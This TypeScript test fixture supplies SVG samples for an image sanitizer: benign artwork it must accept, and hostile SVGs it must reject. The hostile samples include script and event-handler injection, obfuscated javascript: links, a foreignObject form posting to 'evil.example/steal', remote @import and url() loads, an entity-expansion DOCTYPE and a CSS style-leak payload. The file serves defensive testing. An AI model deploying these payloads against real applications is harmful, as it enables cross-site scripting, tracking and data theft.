/**
 * SVG documents for the document-policy and preview tests: ordinary artwork
 * that must be accepted, and hostile documents that must not affect the app
 * or survive into a saved file.
 */
const NS = 'xmlns="http://www.w3.org/2000/svg"';
const XLINK = 'xmlns:xlink="http://www.w3.org/1999/xlink"';

/** Accepted: real-world features the preview must keep. */
export const ACCEPTED_SVGS: Record<string, string> = {
  'a plain icon': `<svg ${NS} viewBox="0 0 24 24"><path d="M4 12l5 5 11-11" fill="none" stroke="#000"/></svg>`,
  'an XML declaration, a public DOCTYPE and comments': `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- generated -->
<svg ${NS} viewBox="0 0 10 10"><rect width="10" height="10"/></svg>
<!-- end -->`,
  'gradients and url(#id) references': `<svg ${NS} ${XLINK} viewBox="0 0 10 10">
  <defs><linearGradient id="g"><stop offset="0" stop-color="red"/><stop offset="1" stop-color="blue"/></linearGradient>
  <symbol id="dot"><circle r="2"/></symbol></defs>
  <rect width="10" height="10" fill="url(#g)" style="filter: url( '#g' )"/>
  <use href="#dot" x="5" y="5"/><use xlink:href="#dot" x="2" y="2"/>
</svg>`,
  'a <style> block with CSS animation': `<svg ${NS} viewBox="0 0 10 10">
  <style><![CDATA[
    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner { animation: spin 1s linear infinite; transform-origin: center; }
    a > b { fill: #f00; }
  ]]></style>
  <circle class="spinner" cx="5" cy="5" r="4"/>
</svg>`,
  'SMIL animation': `<svg ${NS} viewBox="0 0 10 10"><circle r="2">
  <animate attributeName="r" values="2;4;2" dur="1s" repeatCount="indefinite"/>
  <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"/>
  <set attributeName="fill" to="blue" begin="1s"/>
</circle></svg>`,
  'text with entities': `<svg ${NS} viewBox="0 0 100 20"><text x="0" y="15">Fish &amp; chips &lt;3 &#x2764;</text></svg>`,
  'an embedded PNG image': `<svg ${NS} viewBox="0 0 1 1"><image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/></svg>`,
  'an embedded data: font': `<svg ${NS} viewBox="0 0 10 10"><style>@font-face { font-family: X; src: url(data:font/woff2;base64,d09GMgAB) format('woff2'); }</style><text>Hi</text></svg>`,
  'a namespaced root': `<svg:svg xmlns:svg="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><svg:rect width="1" height="1"/></svg:svg>`,
};

/** Rejected by the policy, with the phrase the rejection reason must contain. */
export const REJECTED_SVGS: Record<string, { svg: string; reason: string }> = {
  'a <script> element': {
    svg: `<svg ${NS}><script>parent.postMessage('x', '*')</script></svg>`,
    reason: '<script>',
  },
  'an upper-case, namespaced <script>': {
    svg: `<svg ${NS} xmlns:h="http://www.w3.org/1999/xhtml"><h:SCRIPT>alert(1)</h:SCRIPT></svg>`,
    reason: '<script>',
  },
  'an onload handler': {
    svg: `<svg ${NS} onload="alert(1)"><rect/></svg>`,
    reason: 'event handler attribute (onload)',
  },
  'an unquoted handler on a child': {
    svg: `<svg ${NS}><rect onclick=alert(1) /></svg>`,
    reason: 'event handler attribute (onclick)',
  },
  'a SMIL onbegin handler': {
    svg: `<svg ${NS}><animate attributeName="x" onbegin="alert(1)" dur="1s"/></svg>`,
    reason: 'event handler',
  },
  'a <foreignObject> form': {
    svg: `<svg ${NS}><foreignObject width="100" height="40"><form xmlns="http://www.w3.org/1999/xhtml" action="https://evil.example/steal"><input name="k"/></form></foreignObject></svg>`,
    reason: '<foreignObject>',
  },
  'an external <image href>': {
    svg: `<svg ${NS}><image href="https://tracker.example/pixel.png" width="1" height="1"/></svg>`,
    reason: 'external resource (https://tracker.example/pixel.png)',
  },
  'an external xlink:href on <use>': {
    svg: `<svg ${NS} ${XLINK}><use xlink:href="sprites.svg#icon"/></svg>`,
    reason: 'external resource (sprites.svg#icon)',
  },
  'an external link': {
    svg: `<svg ${NS}><a href="https://evil.example/"><rect width="10" height="10"/></a></svg>`,
    reason: 'external resource',
  },
  'a javascript: link': {
    svg: `<svg ${NS}><a href="javascript:alert(1)"><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'an entity-encoded javascript: link': {
    svg: `<svg ${NS} ${XLINK}><a xlink:href="&#106;ava&#x09;script&#58;alert(1)"><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'SMIL rewriting a link to javascript:': {
    svg: `<svg ${NS}><a href="#"><set to="javascript:alert(1)" attributeName="href"/><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'SMIL rewriting a link target': {
    svg: `<svg ${NS}><a href="#"><animate attributeName="xlink:href" values="#a;#b" dur="1s"/><rect/></a></svg>`,
    reason: 'SMIL on href',
  },
  'a remote fill url()': {
    svg: `<svg ${NS}><rect fill="url(https://evil.example/paint.svg#p)"/></svg>`,
    reason: 'external resource (https://evil.example/paint.svg#p)',
  },
  'a stylesheet @import': {
    svg: `<svg ${NS}><style>@import url("https://fonts.example/css");</style><text>Hi</text></svg>`,
    reason: '@import',
  },
  'an entity-encoded @import inside <style>': {
    svg: `<svg ${NS}><style>&#64;import 'https://evil.example/x.css';</style></svg>`,
    reason: '@import',
  },
  'a CSS-escaped remote url()': {
    svg: `<svg ${NS}><style>rect { background: \\75 rl(https://evil.example/x.png); }</style></svg>`,
    reason: 'external resource',
  },
  'a comment-split @import': {
    svg: `<svg ${NS}><style>@im/**/port url(x.css);</style></svg>`,
    reason: '@import',
  },
  'a protocol-relative image': {
    svg: `<svg ${NS}><image href="//evil.example/x.png"/></svg>`,
    reason: 'external resource',
  },
  'a remote filter image': {
    svg: `<svg ${NS}><filter id="f"><feImage href="https://evil.example/x.png"/></filter></svg>`,
    reason: 'external resource',
  },
  'a remote xml:base': {
    svg: `<svg ${NS} xml:base="https://evil.example/"><image href="#x"/></svg>`,
    reason: 'external resource',
  },
  'a NUL-split javascript: URL': {
    svg: `<svg ${NS}><a href="java&#0;script:alert(1)"><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'a nested SVG data URL': {
    svg: `<svg ${NS}><image href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=" width="1" height="1"/></svg>`,
    reason: 'external resource',
  },
  'an HTML data URL': {
    svg: `<svg ${NS}><a href="data:text/html,<script>alert(1)</script>"><rect/></a></svg>`,
    reason: 'data:text/html',
  },
  'an xml-stylesheet processing instruction': {
    svg: `<?xml-stylesheet href="https://evil.example/x.css"?><svg ${NS}/>`,
    reason: 'processing instruction',
  },
  'entity definitions in the DOCTYPE': {
    svg: `<!DOCTYPE svg [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><svg ${NS}><text>&lol2;</text></svg>`,
    reason: 'defines entities',
  },
  'an HTML root': {
    svg: `<html><body><svg ${NS}/></body></html>`,
    reason: '<svg> root',
  },
  'two root elements': {
    svg: `<svg ${NS}/><svg ${NS}/>`,
    reason: 'content after its </svg>',
  },
  'an unclosed element': {
    svg: `<svg ${NS}><g><rect/></svg>`,
    reason: "isn't well-formed",
  },
  'control characters': {
    svg: `<svg ${NS}><scr\u0000ipt/></svg>`,
    reason: 'control characters',
  },
  'an unpaired surrogate': {
    svg: `<svg ${NS}><text>\ud800</text></svg>`,
    reason: 'control characters',
  },
};

/** Generated markup that tries to restyle the app and collide with its ids. */
export const STYLE_LEAK_SVG = `<svg ${NS} id="monitor-frame" viewBox="0 0 10 10">
  <style>
    * { display: none !important; }
    body, .app-container, .settings-overlay { visibility: hidden !important; background: red !important; }
  </style>
  <defs><linearGradient id="skull"><stop offset="0" stop-color="red"/></linearGradient></defs>
  <rect id="pixel-leak-marker" width="10" height="10" fill="url(#skull)"/>
</svg>`;
